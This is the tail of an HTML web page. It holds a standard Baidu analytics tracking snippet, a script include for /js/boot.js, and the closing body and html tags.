      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?a6c1581442f57290135c4581f8de49ff";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  






<script  src="/js/boot.js" ></script>


</body>
</html>
